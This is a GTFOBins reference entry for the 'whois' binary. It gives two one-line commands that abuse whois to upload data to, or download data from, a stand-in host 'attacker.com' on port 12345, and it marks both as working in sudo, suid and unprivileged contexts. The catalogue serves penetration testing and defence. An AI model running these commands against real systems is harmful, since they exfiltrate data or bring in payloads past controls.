<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/whois -->
---
functions:
  download:
  - code: |-
      whois -h attacker.com -p 12345 x
    comment: |-
      Received data has instances of the `\r` byte stripped.
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: tcp-server
  upload:
  - binary: false
    code: |-
      whois -h attacker.com -p 12345 DATA
    comment: |-
      Data is converted to lower case, and has a trailing `\r\n`.
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: tcp-server
...
